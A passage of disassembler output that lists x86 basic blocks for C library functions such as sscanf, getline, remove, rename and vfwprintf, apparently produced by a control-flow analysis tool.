0xb04ffe0:	cmp	dword ptr [ebp - 0x14c], -1
0xb04ffe7:	je	0xb050bb0
None
|
|
|
v
0xb04dad8:	cmp	al, 0x2a
0xb04dada:	je	0xb04daf3
None
|
|
|
v
0xb04d7b0:	mov	edi, dword ptr [ebp - 0x180]
0xb04d7b6:	mov	edi, dword ptr [edi + 0x34]
0xb04d7b9:	movzx	edx, word ptr [edi + edx]
0xb04d7bd:	and	dh, 0x20
0xb04d7c0:	je	0xb04fb78
None
|
|
|
v
0xb04ff65:	mov	edx, dword ptr [ebp - 0x194]
0xb04ff6b:	mov	dword ptr [edx], eax
0xb04ff6d:	add	dword ptr [ebp - 0x188], 1
0xb04ff74:	mov	dword ptr [ebp - 0x194], 0
0xb04ff7e:	mov	dword ptr [ebp - 0x158], edi
0xb04ff84:	jmp	0xb04d765
None
|
|
|
v
0xb04dac2:	mov	ecx, dword ptr [ebp - 0x178]
0xb04dac8:	xor	edi, edi
0xb04daca:	mov	dword ptr [ebp + 8], esi
0xb04dacd:	mov	esi, dword ptr [ebp - 0x18c]
0xb04dad3:	add	ecx, 1
0xb04dad6:	jmp	0xb04daec
None
|
|
|
v
0xb052cda:	cmp	eax, 0xff
0xb052cdd:	mov	edx, eax
0xb052cdf:	jne	0xb04fdda
None
|
|
|
v
0xb050085:	mov	edx, dword ptr [ebp - 0x160]
0xb05008b:	add	edi, 1
0xb05008e:	movzx	eax, byte ptr [ebp - 0x154]
0xb050095:	cmp	byte ptr [edx + ecx], al
0xb050098:	jne	0xb05004d
None
|
|
|
v
0xb05085e:	mov	eax, dword ptr [ebp - 0x198]
0xb050864:	mov	ecx, dword ptr [eax]
0xb050866:	add	eax, 4
0xb050869:	mov	dword ptr [ebp - 0x198], eax
0xb05086f:	mov	dword ptr [ebp - 0x1a4], ecx
0xb050875:	mov	ecx, dword ptr [ebp - 0x1a4]
0xb05087b:	test	ecx, ecx
0xb05087d:	jne	0xb04f0d1
None
|
|
|
v
0xb04dbf4:	mov	eax, dword ptr [ebx - 0xdc]
0xb04dbfa:	mov	edi, dword ptr [ebp - 0x170]
0xb04dc00:	mov	ecx, dword ptr [ebp - 0x174]
0xb04dc06:	mov	dword ptr [edi + eax], ecx
0xb04dc09:	mov	eax, dword ptr [ebp - 0x188]
0xb04dc0f:	mov	edi, 1
0xb04dc14:	test	eax, eax
0xb04dc16:	jne	0xb04db90
None
|
|
|
v
0xb0535a8:	mov	eax, dword ptr [ebp - 0x194]
0xb0535ae:	mov	edi, dword ptr [ebp - 0x190]
0xb0535b4:	add	dword ptr [ebp - 0x188], 1
0xb0535bb:	mov	eax, dword ptr [eax]
0xb0535bd:	mov	dword ptr [ebp - 0x194], 0
0xb0535c7:	mov	dword ptr [eax + edi*4 - 4], 0
0xb0535cf:	mov	edi, 2
0xb0535d4:	jmp	0xb04db90
None
|
|
|
v
0xb04dbd0:	mov	eax, dword ptr [ebp - 0x194]
0xb04dbd6:	test	eax, eax
0xb04dbd8:	jne	0xb052b18
None
|
|
|
v
0xb04fe8f:	mov	edx, dword ptr [ebp - 0x150]
0xb04fe95:	test	eax, eax
0xb04fe97:	je	0xb0532d0
None
|
|
|
v
0xb04dab8:	mov	dword ptr [ebp - 0x190], 0
0xb04dac2:	mov	ecx, dword ptr [ebp - 0x178]
0xb04dac8:	xor	edi, edi
0xb04daca:	mov	dword ptr [ebp + 8], esi
0xb04dacd:	mov	esi, dword ptr [ebp - 0x18c]
0xb04dad3:	add	ecx, 1
0xb04dad6:	jmp	0xb04daec
None
|
|
|
v
0xb04f117:	mov	eax, dword ptr [ebp - 0x178]
0xb04f11d:	mov	edi, dword ptr [ebp - 0x160]
0xb04f123:	movzx	edx, byte ptr [eax]
0xb04f126:	cmp	dl, 0x2d
0xb04f129:	je	0xb050230
None
|
|
|
v
0xb04da97:	movzx	ecx, byte ptr [ebp - 0x15c]
0xb04da9e:	sub	ecx, 0x25
0xb04daa1:	cmp	cl, 0x53
0xb04daa4:	ja	0xb04f5e8
None
|
|
|
v
0xb04f0a7:	mov	eax, dword ptr [eax]
0xb04f0a9:	cmp	eax, 0x20
0xb04f0ac:	lea	edx, dword ptr [eax + 1]
0xb04f0af:	je	0xb052ef6
None
|
|
|
v
0xb04d963:	mov	edx, dword ptr [ebp - 0x154]
0xb04d969:	lea	ecx, dword ptr [edi + 1]
0xb04d96c:	mov	dword ptr [ebp - 0x16c], ecx
0xb04d972:	mov	byte ptr [ebp - 0x15c], al
0xb04d978:	test	edx, edx
0xb04d97a:	jne	0xb04d9d7
None
|
|
|
v
0xb050475:	lea	eax, dword ptr [edi + 2]
0xb050478:	mov	dword ptr [ebp - 0x178], eax
0xb05047e:	mov	byte ptr [ebp - 0x154], 1
0xb050485:	jmp	0xb04f0e2
None
|
|
|
v
0xb050ee2:	mov	dword ptr [esp], esi
0xb050ee5:	call	0xb070a80
None
|
|
|
v
0xb04dbaa:	cmp	byte ptr [ebp - 0x19d], 0
0xb04dbb1:	jne	0xb04dc98
None
|
|
|
v
0xb04d790:	mov	eax, dword ptr [ebp - 0x14c]
0xb04d796:	jmp	0xb04d7c6
None
|
|
|
v
0xb04dc3f:	mov	dword ptr [edx + 8], 0
0xb04dc46:	cmp	dword ptr gs:[0xc], 0
0xb04dc4e:	je	0xb04dc51
None
|
|
|
v
0xb050117:	mov	edx, dword ptr [ebp - 0x194]
0xb05011d:	mov	dword ptr [edx], eax
0xb05011f:	add	dword ptr [ebp - 0x188], 1
0xb050126:	mov	dword ptr [ebp - 0x1a4], ecx
0xb05012c:	mov	dword ptr [ebp - 0x158], edi
0xb050132:	mov	dword ptr [ebp - 0x154], 0
0xb05013c:	mov	dword ptr [ebp - 0x194], 0
0xb050146:	jmp	0xb04d76f
None
|
|
|
v
0xb04db73:	mov	eax, dword ptr [ebp - 0x188]
0xb04db79:	mov	edi, 1
0xb04db7e:	test	eax, eax
0xb04db80:	jne	0xb04db90
None
|
|
|
v
0xb051b51:	mov	eax, dword ptr [ebx - 0xdc]
0xb051b57:	mov	edi, dword ptr [ebp - 0x170]
0xb051b5d:	mov	dword ptr [edi + eax], 0x16
0xb051b64:	jmp	0xb04d800
None
|
|
|
v
0xb04f5e8:	mov	edi, 2
0xb04f5ed:	jmp	0xb04db90
None
|
|
|
v
0xb04d563:	mov	ecx, dword ptr [ebx - 0xf8]
0xb04d569:	test	ecx, ecx
0xb04d56b:	je	0xb04d7e7
None
|
|
|
v
0xb052b28:	mov	eax, dword ptr [ebp - 0x188]
0xb052b2e:	mov	dword ptr [edi], 0
0xb052b34:	jmp	0xb04dbe4
None
|
|
|
v
0xb04d6d5:	mov	eax, dword ptr [esi + 4]
0xb04d6d8:	cmp	eax, dword ptr [esi + 8]
0xb04d6db:	jae	0xb052b39
None
|
|
|
v
0xb04d723:	nop	
0xb04d724:	lea	esi, dword ptr [esi]
None
|
|
|
v
0xb04ee50:	lea	eax, dword ptr [edx + 1]
0xb04ee53:	mov	dword ptr [ebp - 0x178], eax
0xb04ee59:	movzx	eax, byte ptr [edx + 1]
0xb04ee5d:	jmp	0xb04dac2
None
|
|
|
v
0xb04dca6:	jmp	0xb04dbb7
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:sscanf
TOTAL BLOCKS :3
0xb0551d5:	add	ebx, 0x155e2b
0xb0551db:	mov	dword ptr [esp + 4], eax
0xb0551df:	mov	eax, dword ptr [esp + 0x20]
0xb0551e3:	mov	dword ptr [esp], eax
0xb0551e6:	call	0xb066200
None
|
|
|
v
0xb0551c0:	push	ebx
0xb0551c1:	sub	esp, 0x18
0xb0551c4:	lea	eax, dword ptr [esp + 0x28]
0xb0551c8:	mov	dword ptr [esp + 8], eax
0xb0551cc:	mov	eax, dword ptr [esp + 0x24]
0xb0551d0:	call	0xb1267db
None
|
|
|
v
0xb0551eb:	add	esp, 0x18
0xb0551ee:	pop	ebx
0xb0551ef:	ret	
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:getline
TOTAL BLOCKS :3
0xb055e3d:	add	ebx, 0x1551c3
0xb055e43:	mov	dword ptr [esp + 8], 0xa
0xb055e4b:	mov	dword ptr [esp + 0xc], eax
0xb055e4f:	mov	eax, dword ptr [esp + 0x24]
0xb055e53:	mov	dword ptr [esp + 4], eax
0xb055e57:	mov	eax, dword ptr [esp + 0x20]
0xb055e5b:	mov	dword ptr [esp], eax
0xb055e5e:	call	0xb064990
None
|
|
|
v
0xb055e30:	push	ebx
0xb055e31:	sub	esp, 0x18
0xb055e34:	mov	eax, dword ptr [esp + 0x28]
0xb055e38:	call	0xb1267db
None
|
|
|
v
0xb055e63:	add	esp, 0x18
0xb055e66:	pop	ebx
0xb055e67:	ret	
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:remove
TOTAL BLOCKS :8
0xb055f2b:	test	eax, eax
0xb055f2d:	setne	al
0xb055f30:	movzx	eax, al
0xb055f33:	neg	eax
0xb055f35:	add	esp, 0x14
0xb055f38:	pop	ebx
0xb055f39:	pop	esi
0xb055f3a:	ret	
None
|
|
|
v
0xb055ef0:	push	esi
0xb055ef1:	push	ebx
0xb055ef2:	sub	esp, 0x14
0xb055ef5:	call	0xb1267db
None
|
|
|
v
0xb055f23:	mov	dword ptr [esp], esi
0xb055f26:	call	0xb0dcf90
None
|
|
|
v
0xb055f40:	add	esp, 0x14
0xb055f43:	mov	eax, 0xffffffff
0xb055f48:	pop	ebx
0xb055f49:	pop	esi
0xb055f4a:	ret	
None
|
|
|
v
0xb055f0c:	test	eax, eax
0xb055f0e:	je	0xb055f35
None
|
|
|
v
0xb055f35:	add	esp, 0x14
0xb055f38:	pop	ebx
0xb055f39:	pop	esi
0xb055f3a:	ret	
None
|
|
|
v
0xb055f10:	mov	eax, dword ptr [ebx - 0xdc]
0xb055f16:	mov	edx, dword ptr gs:[0]
0xb055f1d:	cmp	dword ptr [edx + eax], 0x15
0xb055f21:	jne	0xb055f40
None
|
|
|
v
0xb055efa:	add	ebx, 0x155106
0xb055f00:	mov	esi, dword ptr [esp + 0x20]
0xb055f04:	mov	dword ptr [esp], esi
0xb055f07:	call	0xb0dcf00
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:rename
TOTAL BLOCKS :5
0xb055f50:	mov	edx, ebx
0xb055f52:	mov	ecx, dword ptr [esp + 8]
0xb055f56:	mov	ebx, dword ptr [esp + 4]
0xb055f5a:	mov	eax, 0x26
0xb055f5f:	call	dword ptr gs:[0x10]
None
|
|
|
v
0xb055f66:	mov	ebx, edx
0xb055f68:	cmp	eax, 0xfffff001
0xb055f6d:	jae	0xb055f70
None
|
|
|
v
0xb055f75:	add	ecx, 0x15508b
0xb055f7b:	mov	ecx, dword ptr [ecx - 0xdc]
0xb055f81:	neg	eax
0xb055f83:	add	ecx, dword ptr gs:[0]
0xb055f8a:	mov	dword ptr [ecx], eax
0xb055f8c:	or	eax, 0xffffffff
0xb055f8f:	ret	
None
|
|
|
v
0xb055f70:	call	0xb1267df
None
|
|
|
v
0xb055f6f:	ret	
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:vfwprintf
TOTAL BLOCKS :421
0xb056cca:	mov	eax, dword ptr [ebp + 8]
0xb056ccd:	cmp	byte ptr [eax + 0x46], 0
0xb056cd1:	je	0xb056e28
None
|
|
|
v
0xb059a57:	mov	edx, dword ptr [ebp - 0x103c]
0xb059a5d:	cmp	edx, eax
0xb059a5f:	jne	0xb0571e6
None
|
|
|
v
0xb05b3e4:	test	eax, eax
0xb05b3e6:	mov	esi, eax
0xb05b3e8:	je	0xb0571e6
None
|
|
|
v
0xb05b022:	mov	edx, dword ptr [eax + 0x10]
0xb05b025:	cmp	edx, dword ptr [eax + 0x14]
0xb05b028:	jae	0xb05b06d
None
|
|
|
v
0xb05a025:	cmp	dword ptr [ebp - 0x10ac], 0
0xb05a02c:	je	0xb05b1bc
None
|
|
|
v
0xb059460:	mov	eax, dword ptr [ecx + esi*4]
0xb059463:	cmp	eax, 5
0xb059466:	jg	0xb0594c8
None
|
|
|
v
0xb058573:	cmp	dword ptr [ebp - 0x10b4], 0
0xb05857a:	je	0xb05858e
None
|
|
|
v
0xb05aed9:	jmp	0xb0571e6
None
|
|
|
v
0xb059584:	lea	eax, dword ptr [ebx - 0x45cdc]
0xb05958a:	mov	dword ptr [esp], eax
0xb05958d:	call	0xb068fe0
None
|
|
|
v
0xb05adfc:	mov	dword ptr [ebp - 0x1038], 0
0xb05ae06:	jmp	0xb0571e6
None
|
|
|
v
0xb05b881:	mov	eax, dword ptr [ebp + 8]
0xb05b884:	mov	dword ptr [esp + 4], 0x2d
0xb05b88c:	mov	dword ptr [esp], eax
0xb05b88f:	call	0xb06a320
None
|
|
|
v
0xb05b3d4:	test	eax, eax
0xb05b3d6:	jne	0xb058d38
None
|
|
|
v
0xb05945a:	lea	esi, dword ptr [esi]
None
|
|
|
v
0xb0585e6:	cmp	dword ptr [ebp - 0x101c], 0x7fffffff
0xb0585f0:	je	0xb0571e6
None
|
|
|
v
0xb05b445:	cmp	edi, eax
0xb05b447:	jne	0xb0571e6
None
|
|
|
v
0xb059dab:	cmp	dword ptr [ebp - 0x1050], 0
0xb059db2:	jne	0xb059e1b
None
|
|
|
v
0xb05b03b:	mov	eax, dword ptr [ebp + 8]
0xb05b03e:	mov	dword ptr [esp + 4], 0x30
0xb05b046:	mov	dword ptr [esp], eax
0xb05b049:	call	0xb06a320
None
|
|
|
v
0xb058646:	cmp	dword ptr [ebp - 0x101c], 0x7fffffff
0xb058650:	je	0xb0571e6
None
|
|
|
v
0xb058532:	mov	edx, dword ptr [ebp - 0x1040]
0xb058538:	sub	edi, esi
0xb05853a:	mov	eax, 0
0xb05853f:	mov	dword ptr [ebp - 0x10b8], edi
0xb058545:	sar	edi, 2
0xb058548:	neg	edi
0xb05854a:	add	edx, edi
0xb05854c:	cmovns	eax, edx
0xb05854f:	cmp	dword ptr [ebp - 0x10b0], 0
0xb058556:	mov	dword ptr [ebp - 0x1040], eax
0xb05855c:	jne	0xb0598c9
None
|
|
|
v
0xb05b574:	add	eax, 1
0xb05b577:	jne	0xb0585e6
None
|
|
|
v
0xb059e44:	mov	esi, edi
0xb059e46:	mov	dword ptr [ebp - 0x10b8], ecx
0xb059e4c:	mov	ecx, 0xa
0xb059e51:	xor	edx, edx
0xb059e53:	div	ecx
0xb059e55:	mov	ecx, dword ptr [ebp - 0x10b8]
0xb059e5b:	sub	esi, 4
0xb059e5e:	mov	edx, dword ptr [ecx + edx*4]
0xb059e61:	test	eax, eax
0xb059e63:	mov	dword ptr [esi], edx
0xb059e65:	jne	0xb059e4c
None
|
|
|
v
0xb056f95:	jne	0xb05bb5c
None
|
|
|
v
0xb05b407:	repne scasb	al, byte ptr es:[edi]
None
|
|
|
v
0xb05b512:	mov	eax, dword ptr [ebp + 8]
0xb05b515:	mov	dword ptr [esp + 8], edi
0xb05b519:	mov	dword ptr [esp + 4], 0x20
0xb05b521:	mov	dword ptr [esp], eax
0xb05b524:	call	0xb0699f0
None
|
|
|
v
0xb0598c9:	cmp	dword ptr [ebp - 0x10a4], 0
0xb0598d0:	je	0xb05a025
None
|
|
|
v
0xb0598fc:	cmp	dword ptr [ebp - 0x101c], 0x7fffffff
0xb059906:	je	0xb0571e6
None
|
|
|
v
0xb05afea:	mov	eax, dword ptr [ebp + 8]
0xb05afed:	mov	dword ptr [esp + 4], 0x2b
0xb05aff5:	mov	dword ptr [esp], eax
0xb05aff8:	call	0xb06a320
None
|
|
|
v
0xb056f80:	mov	dword ptr [edx + 8], 0
0xb056f87:	cmp	dword ptr gs:[0xc], 0
0xb056f8f:	je	0xb056f92
None
|
|
|
v
0xb059d60:	cmp	dword ptr [ebp - 0x10a0], 0x58
0xb059d67:	lea	edx, dword ptr [ebx - 0x50820]
0xb059d6d:	mov	eax, dword ptr [ebp - 0x103c]
0xb059d73:	lea	ecx, dword ptr [ebx - 0x50780]
0xb059d79:	cmove	ecx, edx
0xb059d7c:	mov	edx, dword ptr [ebp - 0x1044]
0xb059d82:	cmp	edx, 0xa
0xb059d85:	je	0xb059e44
None
|
|
|
v
0xb057038:	lea	esp, dword ptr [ebp - 0xc]
0xb05703b:	mov	eax, 0xffffffff
0xb057040:	pop	ebx
0xb057041:	pop	esi
0xb057042:	pop	edi
0xb057043:	pop	ebp
0xb057044:	ret	
None
|
|
|
v
0xb058562:	sub	edi, eax
0xb058564:	add	edi, dword ptr [ebp - 0x1048]
0xb05856a:	cmp	dword ptr [ebp - 0x103c], 0
0xb058571:	je	0xb05858e
None
|
|
|
v
0xb05aea3:	mov	eax, dword ptr [ebp - 0x1048]
0xb05aea9:	lea	edi, dword ptr [eax*4 + 0x80]
0xb05aeb0:	add	edi, dword ptr [ebp - 0x1038]
0xb05aeb6:	jmp	0xb059750
None
|
|
|
v
0xb056dde:	mov	eax, dword ptr [ebp + 8]
0xb056de1:	mov	edx, dword ptr [eax + 0x48]
0xb056de4:	sub	dword ptr [edx + 4], 1
0xb056de8:	je	0xb056f80
None
|
|
|
v
0xb05aefa:	jmp	0xb0571e6
None
|
|
|
v
0xb05b1bc:	cmp	dword ptr [ebp - 0x10a8], 0
0xb05b1c3:	je	0xb05991a
None
|
|
|
v
0xb058dfa:	cmp	dword ptr [ebp - 0x101c], 0
0xb058e01:	mov	dword ptr [ebp - 0x1040], edx
0xb058e07:	js	0xb05b1f4
None
|
|
|
v
0xb05b465:	add	eax, 1
0xb05b468:	jne	0xb0598fc
None
|
|
|
v
0xb059d59:	mov	byte ptr [ebp - 0x104a], 0x20
0xb059d60:	cmp	dword ptr [ebp - 0x10a0], 0x58
0xb059d67:	lea	edx, dword ptr [ebx - 0x50820]
0xb059d6d:	mov	eax, dword ptr [ebp - 0x103c]
0xb059d73:	lea	ecx, dword ptr [ebx - 0x50780]
0xb059d79:	cmove	ecx, edx
0xb059d7c:	mov	edx, dword ptr [ebp - 0x1044]
0xb059d82:	cmp	edx, 0xa
0xb059d85:	je	0xb059e44
None
|
|
|
v
0xb05995b:	lea	ecx, dword ptr [edx + 4]
0xb05995e:	mov	dword ptr [eax + 0x10], ecx
0xb059961:	mov	dword ptr [edx], 0x30
0xb059967:	cmp	dword ptr [ebp - 0x101c], 0x7fffffff
0xb059971:	je	0xb0571e6
None
|
|
|
v
0xb05a2a2:	mov	dword ptr [ebp - 0x103c], 0
0xb05a2ac:	mov	edi, eax
0xb05a2ae:	jmp	0xb058d8d
None
|
|
|
v
0xb05b554:	add	dword ptr [ebp - 0x101c], edi
0xb05b55a:	xor	edi, edi
0xb05b55c:	jmp	0xb0585b3
None
|
|
|
v
0xb056d73:	mov	eax, dword ptr [ebp + 8]
0xb056d76:	mov	eax, dword ptr [eax + 0x48]
0xb056d79:	mov	dword ptr [eax + 8], esi
0xb056d7c:	mov	eax, dword ptr [ebp + 8]
0xb056d7f:	mov	edx, dword ptr [eax + 0x48]
0xb056d82:	add	dword ptr [edx + 4], 1
0xb056d86:	mov	eax, dword ptr [ebp - 0x1028]
0xb056d8c:	sub	eax, dword ptr [ebp + 0xc]
0xb056d8f:	mov	edx, dword ptr [ebp + 8]
0xb056d92:	mov	ecx, dword ptr [ebp + 0xc]
0xb056d95:	mov	edi, eax
0xb056d97:	mov	eax, dword ptr [ebp + 8]
0xb056d9a:	sar	edi, 2
0xb056d9d:	mov	dword ptr [ebp - 0x101c], edi
0xb056da3:	movsx	eax, byte ptr [eax + 0x46]
0xb056da7:	mov	eax, dword ptr [edx + eax + 0x94]
0xb056dae:	mov	dword ptr [esp + 8], edi
0xb056db2:	mov	dword ptr [esp + 4], ecx
0xb056db6:	mov	dword ptr [esp], edx
0xb056db9:	call	dword ptr [eax + 0x1c]
None
|
|
|
v
0xb059f66:	cmp	dword ptr [ebp - 0x10ac], 0
0xb059f6d:	je	0xb05b00b
None
|
|
|
v
0xb056e02:	lea	esp, dword ptr [ebp - 0xc]
0xb056e05:	pop	ebx
0xb056e06:	pop	esi
0xb056e07:	pop	edi
0xb056e08:	pop	ebp
0xb056e09:	ret	
None
|
|
|
v
0xb05b869:	mov	dword ptr [ebp - 0x103c], 0
0xb05b873:	mov	edi, eax
0xb05b875:	jmp	0xb058d8d
None
|
|
|
v
0xb05ad5d:	jmp	0xb0571e6
None
|
|
|
v
0xb059e6c:	mov	dword ptr [ebp - 0x1040], 1
0xb059e76:	jmp	0xb059d60
None
|
|
|
v
0xb059471:	cmp	eax, 1
0xb059474:	jg	0xb059518
None
|
|
|
v
0xb0598b4:	mov	dword ptr [esi], 0xffffffff
0xb0598ba:	mov	dword ptr [ebp - 0x1040], 0xffffffff
0xb0598c4:	jmp	0xb0596e7
None
|
|
|
v
0xb0597d1:	mov	ecx, dword ptr [ebp - 0x103c]
0xb0597d7:	mov	dword ptr [esp + 4], esi
0xb0597db:	mov	dword ptr [esp + 8], ecx
0xb0597df:	mov	ecx, dword ptr [ebp + 8]
0xb0597e2:	mov	dword ptr [esp], ecx
0xb0597e5:	mov	ecx, dword ptr [ebp - 0x1044]
0xb0597eb:	call	dword ptr [eax + ecx]
None
|
|
|
v
0xb0597cb:	mov	eax, dword ptr [ebx + 0x3768]
0xb0597d1:	mov	ecx, dword ptr [ebp - 0x103c]
0xb0597d7:	mov	dword ptr [esp + 4], esi
0xb0597db:	mov	dword ptr [esp + 8], ecx
0xb0597df:	mov	ecx, dword ptr [ebp + 8]
0xb0597e2:	mov	dword ptr [esp], ecx
0xb0597e5:	mov	ecx, dword ptr [ebp - 0x1044]
0xb0597eb:	call	dword ptr [eax + ecx]
None
|
|
|
v
0xb058cce:	cmp	dword ptr [ebp - 0x10a0], 0x53
0xb058cd5:	je	0xb05a287
None
|
|
|
v
0xb0597bf:	mov	dword ptr [eax], edx
0xb0597c1:	add	eax, 4
0xb0597c4:	add	edx, 0xc
0xb0597c7:	cmp	eax, ecx
0xb0597c9:	jne	0xb0597bf
None
|
|
|
v
0xb059427:	mov	ecx, dword ptr [ebp - 0x1044]
0xb05942d:	jmp	0xb0593a8
None
|
|
|
v
0xb059e1b:	cmp	dword ptr [ebp - 0x10c4], 0
0xb059e22:	je	0xb059db4
None
|
|
|
v
0xb058dd3:	mov	ecx, dword ptr [ebp - 0x101c]
0xb058dd9:	cmp	ecx, 0x7ffffffe
0xb058ddf:	ja	0xb05ae0b
None
|
|
|
v
0xb05b4af:	jmp	0xb058390
None
|
|
|
v
0xb059f81:	mov	edx, dword ptr [eax + 0x10]
0xb059f84:	cmp	edx, dword ptr [eax + 0x14]
0xb059f87:	jae	0xb05afea
None
|
|
|
v
0xb05affd:	add	eax, 1
0xb05b000:	jne	0xb0585e6
None
|
|
|
v
0xb05b089:	jmp	0xb0571e6
None
|
|
|
v
0xb058d38:	lea	eax, dword ptr [esi + 0x1e]
0xb058d3b:	and	eax, 0xfffffff0
0xb058d3e:	sub	esp, eax
0xb058d40:	lea	esi, dword ptr [esp + 0x23]
0xb058d44:	and	esi, 0xfffffff0
0xb058d47:	mov	dword ptr [ebp - 0x103c], 0
0xb058d51:	lea	edx, dword ptr [ebp - 0xfe8]
0xb058d57:	xor	eax, eax
0xb058d59:	mov	edi, edx
0xb058d5b:	mov	ecx, 2
0xb058d60:	rep stosd	dword ptr es:[edi], eax
None
|
|
|
v
0xb05a040:	mov	edx, dword ptr [eax + 0x10]
0xb05a043:	cmp	edx, dword ptr [eax + 0x14]
0xb05a046:	jae	0xb05b19b
None
|
|
|
v
0xb05ae0b:	lea	eax, dword ptr [ebx - 0x4a558]
0xb05ae11:	mov	dword ptr [esp + 0xc], eax
0xb05ae15:	mov	dword ptr [esp + 8], 0x7ff
0xb05ae1d:	jmp	0xb05ad74
None
|
|
|
v
0xb057020:	mov	eax, dword ptr [ebp - 0x1024]
0xb057026:	mov	ecx, dword ptr [ebx - 0xdc]
0xb05702c:	mov	dword ptr [eax + ecx], 0x16
0xb057033:	nop	
0xb057034:	lea	esi, dword ptr [esi]
0xb057038:	lea	esp, dword ptr [ebp - 0xc]
0xb05703b:	mov	eax, 0xffffffff
0xb057040:	pop	ebx
0xb057041:	pop	esi
0xb057042:	pop	edi
0xb057043:	pop	ebp
0xb057044:	ret	
None
|
|
|
v
0xb059498:	lea	eax, dword ptr [ebx - 0x4a558]
0xb05949e:	mov	dword ptr [esp + 0xc], eax
0xb0594a2:	lea	eax, dword ptr [ebx - 0x4a72d]
0xb0594a8:	mov	dword ptr [esp + 4], eax
0xb0594ac:	lea	eax, dword ptr [ebx - 0x4a707]
0xb0594b2:	mov	dword ptr [esp + 8], 0x773
0xb0594ba:	mov	dword ptr [esp], eax
0xb0594bd:	call	0xb027820
None
|
|
|
v
0xb05b3cc:	mov	dword ptr [esp], esi
0xb05b3cf:	call	0xb0f8ac0
None
|
|
|
v
0xb05adc5:	test	eax, eax
0xb05adc7:	mov	dword ptr [ebp - 0x105c], eax
0xb05adcd:	je	0xb05adfc
None
|
|
|
v
0xb0594d8:	cmp	eax, 0x400
0xb0594dd:	je	0xb059518
None
|
|
|
v
0xb059ed2:	mov	esi, edi
0xb059ed4:	mov	byte ptr [ebp - 0x104a], 0x20
0xb059edb:	jmp	0xb0584fe
None
|
|
|
v
0xb058421:	mov	dword ptr [ebp - 0x1038], 0
0xb05842b:	jmp	0xb0571f0
None
|
|
|
v
0xb059e67:	jmp	0xb059dab
None
|
|
|
v
0xb05b894:	add	eax, 1
0xb05b897:	jne	0xb0598fc
None
|
|
|
v
0xb058ea4:	mov	ecx, dword ptr [ebp - 0x1044]
0xb058eaa:	add	dword ptr [ebp - 0x101c], edx
0xb058eb0:	sub	ecx, eax
0xb058eb2:	cmp	edx, ecx
0xb058eb4:	ja	0xb058740
None
|
|
|
v
0xb05840f:	mov	eax, dword ptr [ebp - 0x1054]
0xb058415:	cmp	dword ptr [ebp - 0x1034], eax
0xb05841b:	ja	0xb0595d4
None
|
|
|
v
0xb05b5a3:	xor	edi, edi
0xb05b5a5:	jmp	0xb0585b3
None
|
|
|
v
0xb058d9b:	cmp	dword ptr [ebp - 0x10b0], 0
0xb058da2:	jne	0xb058dfa
None
|
|
|
v
0xb058e93:	mov	eax, dword ptr [ebp - 0x101c]
0xb058e99:	cmp	eax, 0x7ffffffe
0xb058e9e:	ja	0xb05ae0b
None
|
|
|
v
0xb059a29:	mov	eax, dword ptr [ebp + 8]
0xb059a2c:	mov	ecx, dword ptr [ebp + 8]
0xb059a2f:	mov	edx, dword ptr [ebp - 0x10b8]
0xb059a35:	movsx	eax, byte ptr [eax + 0x46]
0xb059a39:	sar	edx, 2
0xb059a3c:	mov	dword ptr [ebp - 0x103c], edx
0xb059a42:	mov	eax, dword ptr [ecx + eax + 0x94]
0xb059a49:	mov	dword ptr [esp + 8], edx
0xb059a4d:	mov	dword ptr [esp + 4], esi
0xb059a51:	mov	dword ptr [esp], ecx
0xb059a54:	call	dword ptr [eax + 0x1c]
None
|
|
|
v
0xb05adbd:	mov	dword ptr [esp], edi
0xb05adc0:	call	0xb0173f0
None
|
|
|
v
0xb05b4ff:	mov	dword ptr [ebp - 0x1040], eax
0xb05b505:	jmp	0xb0582e0
None
|
|
|
v
0xb05b4a1:	mov	eax, dword ptr [ebp - 0x1038]
0xb05b4a7:	mov	dword ptr [esp], eax
0xb05b4aa:	call	0xb017470
None
|
|
|
v
0xb05b473:	lea	eax, dword ptr [ebx - 0x4a558]
0xb05b479:	mov	dword ptr [esp + 0xc], eax
0xb05b47d:	mov	dword ptr [esp + 8], 0x7fe
0xb05b485:	jmp	0xb05ad74
None
|
|
|
v
0xb05ad9b:	add	eax, 1
0xb05ad9e:	jne	0xb0591fb
None
|
|
|
v
0xb058528:	mov	dword ptr [esi - 4], 0x30
0xb05852f:	sub	esi, 4
0xb058532:	mov	edx, dword ptr [ebp - 0x1040]
0xb058538:	sub	edi, esi
0xb05853a:	mov	eax, 0
0xb05853f:	mov	dword ptr [ebp - 0x10b8], edi
0xb058545:	sar	edi, 2
0xb058548:	neg	edi
0xb05854a:	add	edx, edi
0xb05854c:	cmovns	eax, edx
0xb05854f:	cmp	dword ptr [ebp - 0x10b0], 0
0xb058556:	mov	dword ptr [ebp - 0x1040], eax
0xb05855c:	jne	0xb0598c9
None
|
|
|
v
0xb0571f0:	cmp	byte ptr [ebp - 0x1049], 0
0xb0571f7:	je	0xb057207
None
|
|
|
v
0xb05923f:	lea	ecx, dword ptr [edx + 4]
0xb059242:	mov	dword ptr [eax + 0x10], ecx
0xb059245:	mov	dword ptr [edx], esi
0xb059247:	add	esi, 1
0xb05924a:	je	0xb0571e6
None
|
|
|
v
0xb05ae58:	lea	eax, dword ptr [ebx - 0x4a558]
0xb05ae5e:	mov	dword ptr [esp + 0xc], eax
0xb05ae62:	mov	dword ptr [esp + 8], 0x7f7
0xb05ae6a:	jmp	0xb05ad74
None
|
|
|
v
0xb056cff:	and	esi, 0x8000
0xb056d05:	mov	dword ptr [ebp - 0x1020], 0
0xb056d0f:	mov	dword ptr [ebp - 0x1028], eax
0xb056d15:	mov	dword ptr [ebp - 0x1018], eax
0xb056d1b:	jne	0xb056d86
None
|
|
|
v
0xb058e4f:	add	dword ptr [ebp - 0x101c], edi
0xb058e55:	cmp	dword ptr [ebp - 0x10b0], 0
0xb058e5c:	je	0xb058eba
None
|
|
|
v
0xb058200:	mov	esi, eax
0xb058202:	xor	edi, edi
0xb058204:	lea	eax, dword ptr [ebp - 0x1010]
0xb05820a:	mov	dword ptr [ebp - 0x103c], 0
0xb058214:	mov	dword ptr [ebp - 0x1034], 0
0xb05821e:	mov	dword ptr [ebp - 0x1038], 0x680
0xb058228:	mov	dword ptr [ebp - 0x1044], eax
